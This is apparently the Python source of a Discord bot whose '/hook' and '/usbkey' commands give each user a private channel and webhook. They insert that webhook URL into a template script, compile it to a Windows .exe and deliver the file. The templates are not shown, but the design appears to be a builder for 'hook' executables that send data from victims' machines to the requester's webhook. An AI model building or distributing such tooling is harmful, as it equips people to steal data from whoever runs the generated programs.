import asyncio
import random
import discord
from discord.errors import HTTPException
from discord.ext import commands
import shutil
import subprocess
import os

intents = discord.Intents.default()
intents.message_content = True

rand = random.randint(1, 100000)
bot = commands.Bot(command_prefix='/', intents=intents)


def replace_text_in_file(filepath, old_text, new_text):
    with open(filepath, 'r+') as file:
        file_contents = file.read()
        file.seek(0)  
        file.write(file_contents.replace(old_text, new_text))
        file.truncate()


def run_batch_file(batch_file_path):
    try:
        
        if not os.path.exists(batch_file_path):
            raise FileNotFoundError(f"The batch file '{batch_file_path}' does not exist.")

       
        dir_path = os.path.dirname(batch_file_path)
        
        if not os.path.exists(dir_path):
            os.makedirs(dir_path)

        result = subprocess.run([batch_file_path], capture_output=True, text=True)
        
        print(result.stdout)
        
        if result.returncode != 0:
            raise Exception(f"Error running batch file: {result.stderr}")
    
    except Exception as e:
        print(f"An error occurred: {e}")





async def safe_send(channel, content=None, file=None):
    retries = 3
    for _ in range(retries):
        try:
            if content:
                await channel.send(content)
            elif file:
                await channel.send(file=file)
            break  
        except HTTPException as e:
            if "rate limit exceeded" in str(e).lower():
                await asyncio.sleep(1)  
            else:
                raise 




@bot.command()
async def bonjour(ctx):
    await ctx.send(f"Bonjour {ctx.author}!")

@bot.command()
async def usbkey(ctx):
    async def number_exists():
        with open("usbIDfile.txt", "r") as IDfile:
            existing_numbers = IDfile.read().splitlines()
            return str(rand) not in existing_numbers

    unique_number_found = False
    while not unique_number_found:
        if await number_exists():
            unique_number_found = True
            with open("usbIDfile.txt", "a") as IDfile:
                IDfile.write(str(rand) + "\n")

            try:
                overwrites = {
                    ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False),
                    ctx.author: discord.PermissionOverwrite(read_messages=True)
                }
                category_name = "Bot Channels"
                category = discord.utils.get(ctx.guild.categories, name=category_name)
                if not category:
                    category = await ctx.guild.create_category_channel(category_name)

                channel = await ctx.guild.create_text_channel(f"USB_KEY-{rand}", overwrites=overwrites, category=category)
                await channel.set_permissions(ctx.author, read_messages=True)
                await safe_send(channel, f"Your USB hook ID is: {rand}.")
                await safe_send(channel, f"Can take a while to send:")
                webhookname = f"USBhook n'{rand}'"
                webhook = await channel.create_webhook(name=webhookname)
                created_webhook = next((w for w in await ctx.guild.webhooks() if w.name == webhookname), None)
                
                if created_webhook:
                    python_content = created_webhook.url 
                else:
                    python_content = "Webhook not found."
                replace_text_in_file(f'USB{rand}.py', 'YOUR_DISCORD_CHANNEL_ID', python_content)

                bat_content = (f'USB{rand}.py')
                shutil.copy('moveUSB.py', f'USB{rand}.py')
                shutil.copy('convertor.bat', f'{rand}.bat')
                replace_text_in_file(f'{rand}.bat', 'name', bat_content)

                batch_file_path = f"{os.getcwd()}\\{rand}.bat"
                run_batch_file(batch_file_path)

                shutil.move(f"D:\\VSCODE\\dist\\{rand}.exe", f"D:\\VSCODE")
                # Send the USB content using the newly created channel
                
                await safe_send(webhook, file=discord.File(f'{rand}.exe'))
            except Exception as e:
                await ctx.send(f"Failed to create channel or send message: {e}")
                print(e)



@bot.command()
async def hook(ctx):
    async def number_exists():
        with open("IDfile.txt", "r") as IDfile:
            existing_numbers = IDfile.read().splitlines()
            return str(rand) not in existing_numbers


    unique_number_found = False
    while not unique_number_found:
        if await number_exists():
            unique_number_found = True
            with open("IDfile.txt", "a") as IDfile:
                IDfile.write(str(rand) + "\n")

            try:
                overwrites = {
                    ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False),
                    ctx.author: discord.PermissionOverwrite(read_messages=True)
                }
                category_name = "Bot Channels"
                category = discord.utils.get(ctx.guild.categories, name=category_name)
                if not category:
                    category = await ctx.guild.create_category_channel(category_name)

                channel = await ctx.guild.create_text_channel(f"private-{rand}", overwrites=overwrites, category=category)
                await channel.set_permissions(ctx.author, read_messages=True)
                await safe_send(channel, f"your Hook ID is : {rand}.")
                await safe_send(channel, f"can take a while to send :")
                webhookname = f"webhook n'{rand}'"
                webhook = await channel.create_webhook(name=webhookname)
                created_webhook = next((w for w in await ctx.guild.webhooks() if w.name == webhookname), None)
                
                bat_content = (f'{rand}.py')
                shutil.copy('webhookcontent.txt', f'{rand}.py')
                if created_webhook:
                    python_content = created_webhook.url 
                else:
                    python_content = "Webhook not found."
                replace_text_in_file(f'{rand}.py', 'webhookfirsturl', python_content)
                replace_text_in_file(f'{rand}.py', '27615.exe', f'{rand}.exe')

                bat_content = (f'{rand}.py')
                shutil.copy('convertor.bat', f'{rand}.bat')
                replace_text_in_file(f'{rand}.bat', 'name', bat_content)

                batch_file_path = f"{os.getcwd()}\\{rand}.bat"
                run_batch_file(batch_file_path)

                shutil.move (f"C:\\VSCODE\\dist\\{rand}.exe", f"C:\\VSCODE")

                await safe_send(webhook, file=discord.File(f'{rand}.exe'))
            except Exception as e:
                await ctx.send(f"Failed to create channel or send message: {e}")
                print(e)
                

token = "put your token here"
bot.run(token)

        
    
